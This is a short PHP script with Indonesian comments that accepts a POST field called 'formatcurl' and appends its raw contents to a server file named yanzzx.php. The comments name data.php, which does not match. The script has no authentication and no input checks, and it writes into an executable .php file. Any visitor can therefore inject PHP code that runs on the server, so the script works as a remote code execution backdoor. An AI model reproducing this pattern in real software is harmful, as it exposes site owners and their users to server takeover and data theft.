<?php
// Menerima data POST
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['formatcurl'])) {
    // Ambil data formatcurl
    $formatcurl = $_POST['formatcurl'];

    // Lokasi file data.php
    $file = 'yanzzx.php';

    // Buka file data.php
    $handle = fopen($file, 'a');

    // Menuliskan formatcurl ke dalam file data.php
    fwrite($handle, $formatcurl . "\n\n");

    // Tutup file
    fclose($handle);

    // Kirim respons berhasil
    echo json_encode(array('success' => true));
} else {
    // Kirim respons gagal jika tidak ada data formatcurl yang diterima
    echo json_encode(array('success' => false, 'message' => 'Data formatcurl tidak ditemukan.'));
}
?>
